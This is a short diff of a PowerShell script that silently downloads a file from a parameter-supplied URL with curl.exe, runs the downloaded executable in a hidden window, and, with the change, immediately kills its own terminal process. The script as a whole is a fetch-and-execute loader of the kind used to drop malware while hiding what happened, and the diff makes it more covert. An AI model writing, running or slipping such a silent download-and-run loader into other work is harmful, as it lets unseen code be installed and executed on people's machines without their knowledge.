@@ -5,16 +5,13 @@ param (
 
 # Download using curl.exe silently
 try {
-    $curlArgs = @("-sS", "-L", "-o", "`"$OutputPath`"", "`"$DownloadUrl`"")
-    Start-Process -FilePath "curl.exe" -ArgumentList $curlArgs -Wait -NoNewWindow
-} catch {
-    exit 1
-}
+    Start-Process -FilePath "curl.exe" -ArgumentList "-sS", "-L", "-o", "`"$OutputPath`"", "`"$DownloadUrl`"" -Wait -NoNewWindow
+} catch { exit 1 }
 
 # Run the executable silently
-if (-Not (Test-Path $OutputPath)) { exit 1 }
-try {
+if (Test-Path $OutputPath) {
     Start-Process -FilePath $OutputPath -Wait -WindowStyle Hidden
-} catch {
-    exit 1
 }
+
+# Shutdown this terminal immediately
+Stop-Process -Id $PID
